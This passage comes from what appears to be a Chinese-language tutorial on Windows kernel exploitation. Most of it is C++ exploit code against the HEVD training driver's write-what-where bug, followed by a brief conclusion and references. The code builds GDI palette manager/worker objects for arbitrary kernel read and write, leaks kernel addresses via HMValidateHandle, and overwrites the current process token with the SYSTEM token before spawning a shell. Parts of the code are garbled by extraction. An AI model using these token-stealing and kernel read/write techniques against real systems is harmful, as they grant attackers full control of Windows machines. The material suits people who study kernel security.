            return 0;
        }
        int pal_cnt = (size - 0x90) / 4;
        int palsize = sizeof(LOGPALETTE) + (static_cast(pal_cnt) - 1) * sizeof(PALETTEENTRY);
        LOGPALETTE* lPalette = (LOGPALETTE*)malloc(palsize);
        printf("palsize      -->%llX\n", palsize);
        printf("lPalette   address   =======>%p\n", lPalette);
        memset(lPalette, 0x66, palsize);
        lPalette->palNumEntries = pal_cnt;
        printf("lPalette->palNumEntries  %llX\n", lPalette->palNumEntries);
        lPalette->palVersion = 0x300;
        printf("lPalette->palVersion %llX\n", lPalette->palVersion);
        //__debugbreak();
        return CreatePalette(lPalette);
    }
    VOID readOOB(HPALETTE worker_palette, HPALETTE manager_palette, DWORD64* target_address, BYTE* data, int size) {
        if (!manager_palette || !worker_palette) {
            printf("Palettes not initialized yet!");
            /*return 0;*/
        }
        // overflow into worker_palette to set values
        SetPaletteEntries(manager_palette, 0, sizeof(PVOID) / sizeof(PALETTEENTRY), (PALETTEENTRY*)&target_address);
        // trigger GetPaletteEntries on worker_palette to read the actual data
        // return actual amount of bytes read (*4), not amount of palette entries read
        //__debugbreak();
        GetPaletteEntries(worker_palette, 0, size / sizeof(PALETTEENTRY), (PALETTEENTRY*)data);
    }
    int writeOOB(HPALETTE worker_palette, HPALETTE manager_palette, UINT64 target_address, BYTE* data, int size) {
        if (!manager_palette || !worker_palette) {
            printf("Palettes not initialized yet!\n");
            return 0;
        }
        // overflow into worker_palette to set values
        SetPaletteEntries(manager_palette, 0, sizeof(PVOID) / sizeof(PALETTEENTRY), (PALETTEENTRY*)&target_address);
        // trigger SetPaletteEntries on worker_palette to write the actual data
        // return actual amount of bytes written (*4), not amount of palette entries written
        return SetPaletteEntries(worker_palette, 0, size / sizeof(PALETTEENTRY), (PALETTEENTRY*)data);
    }
    PVOID Find_Functions(LPCSTR Dll_Name, LPCSTR F_Name) {
        HMODULE Dll_HMODULE = NULL;
        PVOID F_Address = NULL;
        Dll_HMODULE = LoadLibraryA(Dll_Name);
        if (Dll_HMODULE == NULL) {
            printf("%s Find Error!\n", Dll_Name);
            return NULL;
        }
        printf("Address(%s):0x%p\n", Dll_Name, Dll_HMODULE);
        F_Address = GetProcAddress(Dll_HMODULE, F_Name);
        if (F_Address == NULL) {
            printf("Function(%s) Find Error!\n", F_Name);
            return NULL;
        }
        printf("Address(%s):0x%p\n", F_Name, F_Address);
        return F_Address;
    }
    PVOID Find_HMValidateHandle(PVOID IsMenu_Address) {
        ULONG64 HMV_Adr = 0;
        while (1) {
            if (*(char*)IsMenu_Address == '\xE8') {
                HMV_Adr = *(ULONG*)((ULONG64)IsMenu_Address + 1);
                HMV_Adr += (ULONG64)IsMenu_Address + 0x05 - 0x100000000;
                return (PVOID)HMV_Adr;
            }
            IsMenu_Address = (char*)IsMenu_Address + 1;
        }
        return 0;
    }
    ULONG64 PEB = NULL, fnDWORD_Address = NULL, To_Where_A_Palette = NULL, ulClientDelta = NULL;
    DWORD64 lpszMenuName(HWND hwnd) {
        IsMenu_Address = Find_Functions("user32.dll", "IsMenu");
        HMValidateHandle_Address = Find_HMValidateHandle(IsMenu_Address);
        printf("HMValidateHandle Address(0x%p)\n", HMValidateHandle_Address);
        HMValidateHandle = (My_HMValidateHandle)HMValidateHandle_Address;
        ULONG64 tagWND = (ULONG64)HMValidateHandle(hwnd, 0x01);
        ulClientDelta = (ULONG64)((*(ULONG64*)(tagWND + 0x20)) - (ULONG64)tagWND);
        DWORD64 KerneltagCLS = (*(ULONG64*)(tagWND + 0xa8)) - ulClientDelta;
        DWORD64 lpszMenuNameA = *(ULONG64*)(KerneltagCLS + 0x98);
        printf("lpszMenuNameA_address   %llX\n", lpszMenuNameA);
        return lpszMenuNameA;
    }
    PGPALETTE CreatePaletteInHole()
    {
        printf("aaaaaa\n");
        PGPALETTE pgpalette = (PGPALETTE)malloc(sizeof(PGPALETTE));
        TCHAR st[0x68];
        WNDCLASSEX Class2 = { 0 };
        DWORD64 lpszMenuNameB = 0x666;
        memset(st, 0x66, sizeof(st));
        Class2.lpfnWndProc = DefWindowProc;
        Class2.lpszClassName = TEXT("k0shl");
        Class2.lpszMenuName = st;
        Class2.cbSize = sizeof(WNDCLASSEX);
        DWORD dwcount = 0;
        for (int i = 0; i pSelf);
            DWORD64 UsertagWND = (DWORD64)tagWND;
            //Int_3();
            DWORD64 ulClientDelta = KerneltagWND - UsertagWND;
            DWORD64 KerneltagCLS = *(PDWORD64)(UsertagWND + 0xa8);
            DWORD64 lpszMenuNameA = *(PDWORD64)(KerneltagCLS - ulClientDelta + 0x98);
            printf("lpszMenuNameA address  --->%llX\n", lpszMenuNameA);
            if (lpszMenuNameB == lpszMenuNameA)
            {
                __debugbreak();
                DestroyWindow(test);
                //createPaletteofSize(0x190);
                UnregisterClass(Class2.lpszClassName, NULL);
                //Int_3();
                __debugbreak();
                pgpalette->_hpalette = (HPALETTE)createPaletteofSize(0x100);
                printf("pgpalette->hpalette  %p\n", pgpalette->_hpalette);
                pgpalette->_kobj_palette = lpszMenuNameA;
                pgpalette->flag = 1;
                printf("success!!!!!\n");
                __debugbreak();
                return pgpalette;
            }
            DestroyWindow(test);
            //createPaletteofSize(0x190);
            UnregisterClass(Class2.lpszClassName, NULL);
            lpszMenuNameB = lpszMenuNameA;
            printf("lpszMenuNameB_address ===>%llX\n", lpszMenuNameB);
        }
        return 0;
    }
    DWORD64 stealToken()
    {
        _NtQuerySystemInformation NtQuerySystemInformation = (_NtQuerySystemInformation)
            GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQuerySystemInformation");
        if (NtQuerySystemInformation == NULL)
        {
            printf("[+]Failed to get NtQuerySystemInformation\n");
            return NULL;
        }
        DWORD len;
        NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &len);
        PSYSTEM_MODULE_INFORMATION moduleInfo = NULL;
        moduleInfo = (PSYSTEM_MODULE_INFORMATION)VirtualAlloc(NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!moduleInfo)
        {
            printf("[+]Failed to get moduleInfo\n");
            return NULL;
        }
        NtQuerySystemInformation(SystemModuleInformation, moduleInfo, len, &len);
        LPVOID kernelBase = moduleInfo->Module[0].ImageBase;
        LPVOID kernelImage = moduleInfo->Module[0].FullPathName;
        printf("[+]kernel base address is at: 0x%p\n", kernelBase);
        LPCSTR lpkernelName = (LPCSTR)(moduleInfo->Module[0].FullPathName + moduleInfo->Module[0].OffsetToFileName);
        printf("[+]kernel name is: %s\n", lpkernelName);
        HMODULE hUserSpacekernel = LoadLibraryExA(lpkernelName, 0, 0);
        if (hUserSpacekernel == NULL)
        {
            VirtualFree(moduleInfo, 0, MEM_RELEASE);
            return NULL;
        }
        FARPROC pUserKernelSymbol = GetProcAddress(hUserSpacekernel, "PsInitialSystemProcess");
        if (pUserKernelSymbol == NULL)
        {
            VirtualFree(moduleInfo, 0, MEM_RELEASE);
            return NULL;
        }
        FARPROC pLiveFunctionAddress = (FARPROC)((PUCHAR)pUserKernelSymbol - (PUCHAR)hUserSpacekernel + (PUCHAR)kernelBase);
        FreeLibrary(hUserSpacekernel);
        VirtualFree(moduleInfo, 0, MEM_RELEASE);
        printf("pLiveFunctionAddress   ============>%llX\n", pLiveFunctionAddress);
        LPVOID lpSystemEPROCESS = NULL;
        LPVOID lpSysProcID = NULL;
        LPVOID lpSystemToken = NULL;
        LIST_ENTRY lpNextEntryAddreess;
        readOOB(Worker_Palette->_hpalette, Manager_Palette->_hpalette, (DWORD64*)pLiveFunctionAddress, (BYTE*)&lpSystemEPROCESS, sizeof(DWORD64));
        //__debugbreak();
        readOOB(Worker_Palette->_hpalette, Manager_Palette->_hpalette, (DWORD64*)((PUCHAR)lpSystemEPROCESS + 0x2e0), (BYTE*)&lpSysProcID, sizeof(DWORD64));
        readOOB(Worker_Palette->_hpalette, Manager_Palette->_hpalette, (DWORD64*)((PUCHAR)lpSystemEPROCESS + 0x358), (BYTE*)&lpSystemToken, sizeof(DWORD64));
        readOOB(Worker_Palette->_hpalette, Manager_Palette->_hpalette, (DWORD64*)((PUCHAR)lpSystemEPROCESS + 0x2f0), (BYTE*)&lpNextEntryAddreess, sizeof(LIST_ENTRY));
        printf("[+]system process PID is: 0x%llX \n", lpSysProcID);
        printf("[+]system process address is: 0x%p\n", lpSystemEPROCESS);
        printf("[+]Next Process AT: 0x%p\n", lpNextEntryAddreess.Flink);
        printf("[+]system process token value is: 0x%p\n", lpSystemToken);
        DWORD64 currentProcessID = GetCurrentProcessId();
        printf("current Process id is  %llX", currentProcessID);
        //DWORD64 currentProcessID = GetCurrentProcessId();
        LPVOID lpNextEPROCESS = NULL;
        LPVOID lpCurrentPID = NULL;
        LPVOID lpCurrentToken = NULL;
        DWORD dwCurrentPID;
        do
        {
            lpNextEPROCESS = (PUCHAR)lpNextEntryAddreess.Flink - 0x2e8;
            readOOB(Worker_Palette->_hpalette, Manager_Palette->_hpalette, (DWORD64*)((PUCHAR)lpNextEPROCESS + 0x2e0), (BYTE*)&lpCurrentPID, sizeof(DWORD64));
            dwCurrentPID = LOWORD(lpCurrentPID);
            printf("dwCurrentPID    %llX\n", dwCurrentPID);
            readOOB(Worker_Palette->_hpalette, Manager_Palette->_hpalette, (DWORD64*)((PUCHAR)lpNextEPROCESS + 0x2e8), (BYTE*)&lpNextEntryAddreess, sizeof(LIST_ENTRY));
        } while (dwCurrentPID != currentProcessID);
        DWORD64 currentTokenAddress = (DWORD64)lpNextEPROCESS + 0x358;
        printf("[+]Start to write token");
        writeOOB(Worker_Palette->_hpalette, Manager_Palette->_hpalette, currentTokenAddress, (BYTE*)&lpSystemToken, sizeof(DWORD64));
        printf("  ====> done! \n");
    }
    int main() {
        init();//Load HEVD Driver and init exploit attack function
        BOOL bFound = FindHMValidateHandle();
        if (!bFound) {
            printf("Failed to locate HmValidateHandle, exiting\n");
            return 0;
        }
        printf("[+]Found location of HMValidateHandle in user32.dll\n");
        Manager_Palette = CreatePaletteInHole();
        printf("create manager palette success!!!\n");
        if (!Manager_Palette)
        {
            printf("Make Manager Palette failure...\n");
            return 0;
        }
        //Int_3();
        printf("[+]Manager Palette HPALETTE: 0x%p, Kernel Address: 0x%llx\n", (PVOID)Manager_Palette->_hpalette, Manager_Palette->_kobj_palette);
        __debugbreak();
        Worker_Palette = CreatePaletteInHole();
        if (!Worker_Palette)
        {
            printf("Make Worker Palette failure...\n");
            return 0;
        }
        //Int_3();
        printf("Worker Palette HPALETTE: 0x%p, Kernel Address: 0x%llx\n", (PVOID)Worker_Palette->_hpalette, Worker_Palette->_kobj_palette);
        WriteWhatWhere = (PWRITE_WHAT_WHERE)HeapAlloc(GetProcessHeap(),
            HEAP_ZERO_MEMORY,
            sizeof(WRITE_WHAT_WHERE));
        if (!WriteWhatWhere) {
            printf("Failed To Allocate Memory: 0x%X\n", GetLastError());
            exit(-1);
        }
        printf("Memory Allocated: 0x%p\n", WriteWhatWhere);
        DWORD64 pFirstColorOffset = 0x78;
        DWORD64 Manager_pFirstColor = Manager_Palette->_kobj_palette + pFirstColorOffset;
        DWORD64 Worker_pFirstColor = Worker_Palette->_kobj_palette + pFirstColorOffset;
        printf("Overwrite Manager Palette pFirstColor: 0x%p\n", Manager_pFirstColor);
        printf("value is Worker Palette pFirstColor: 0x%p\n", Worker_pFirstColor);
        WriteWhatWhere->What = (PULONG_PTR)&Worker_pFirstColor;
        WriteWhatWhere->Where = (PULONG_PTR)Manager_pFirstColor;
        printf("WriteWhatWhere->What   %llX", WriteWhatWhere->What);
        printf("WriteWhatWhere->Where  %llX", WriteWhatWhere->Where);
        DeviceIoControl(hDevice, 0x0022200B, (LPVOID)WriteWhatWhere, sizeof(WriteWhatWhere), NULL, 0, &BytesReturned, NULL);
        stealToken();
        CreateCmd();
        system("pause");
        return 0;
    }
最后可以看到提权成功:
## 0x07:总结
首先一点就是我在学习过程中经常碰到一些陌生的名词,让人很困扰.所以我在这篇文章里尽量少提相关的名词,并把它们关联起来.还有一点就是上一篇文章还是不够严谨,出现了一些错误,然后就是感到抱歉,过了这么久才回复指出我错误的师傅,最后,
**感谢指出我错误的师傅**.
## 0x08:参考
代码参考  
理论参考  
extension://bfdogplmndidlpjfhoijckpakkdjkkil/pdf/viewer.html?file=https%3A%2F%2Flabs.bluefrostsecurity.de%2Ffiles%2FAbusing_GDI_for_ring0_exploit_primitives_Evolution_Slides.pdf  
extension://bfdogplmndidlpjfhoijckpakkdjkkil/pdf/viewer.html?file=https%3A%2F%2Fcensus-labs.com%2Fmedia%2Fwindows_10_rs2_rs3_exploitation_primitives.pdf  